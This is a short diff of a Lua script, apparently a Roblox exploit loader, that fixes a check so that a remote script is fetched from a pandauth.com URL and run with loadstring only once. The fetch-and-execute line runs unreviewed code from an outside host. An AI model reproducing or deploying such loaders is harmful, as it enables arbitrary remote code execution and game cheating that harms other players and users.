@@ -6,12 +6,18 @@ local function checkandrun()
     local ui = gethui()
     if ui == nil then ui = game:GetService("CoreGui") end
     if ui then
+        local script = false
         for _, desc in pairs(ui:GetDescendants()) do
-            if not string.find(string.lower(desc.Name), "cascade") then
-                print("executing main")
-                loadstring(game:HttpGet("https://vss.pandauth.com/kv/1e4431d40c202812"))()
+            if string.find(string.lower(desc.Name), "cascade") then
+                script = true
             end
         end
+
+        if script == false then
+
+            loadstring(game:HttpGet("https://vss.pandauth.com/kv/1e4431d40c202812"))()
+
+        end 
     end
 end
 
